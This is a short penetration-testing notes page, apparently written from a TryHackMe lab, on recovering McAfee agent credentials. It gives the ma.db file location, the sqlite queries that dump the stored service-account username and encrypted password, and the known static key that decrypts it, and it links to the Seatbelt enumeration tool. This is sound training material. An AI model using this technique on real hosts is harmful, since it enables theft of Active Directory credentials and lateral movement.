---
title: Configuration Files
---

## [MCAfee]

:::info This Section Covers How to Retrive `MCAfee` Credentials

:::

<br/>

**McAfee** embeds the Credentials used during Installation to Connect back to the Orchestrator in a file called **`ma.db`.** This Database File can be retrieved and read with Local Access to the Host to recover the associated <b style={{ color: 'DeepSkyBlue' }}>Active Directory</b> Service Account. 

---

<br/>


- **MCAfee Database Location `C:\ProgramData\McAfee\Agent\DB`**

```log
Directory of C:\ProgramData\McAfee\Agent\DB
03/05/2022  10:03 AM    <DIR>           .
03/05/2022  10:03 AM    <DIR>           .
// highlight-next-line
03/05/2022  10:03 AM            120,832 ma.db
```

<br/>

- We can use **`sqlite`** to Read **Database Data**


```sql
sqlite> .tables
AGENT_CHILD              AGENT_PROXIES         
AGENT_LOGS               AGENT_PROXY_CONFIG     
AGENT_PARENT             AGENT_REPOSITORIES     
sqlite> PRAGMA table_info(AGENT_REPOSITORIES);
1| NAME        |
2| AUTH_USER   |
3| AUTH_PASSWD |
sqlite> SELECT * FROM AGENT_REPOSITORIES;
TryHackMe EPO|svcAV|jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
```

<br/>

- **McAfee** Encrypts **`AUTH_PASSWD`** Field with a Known Key: <b style={{ color: 'Coral' }}>12150F10111C1A060A1F1B1817160519</b>

```js
jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
```

<br/>

## SEATBELT

**`Seatbelt`** can be Used to Enumerate the Entire Machine for Sensitive Information.

- <a class="button button--outline button--info" href="https://github.com/GhostPack/Seatbelt">SEATBELT GitHub</a>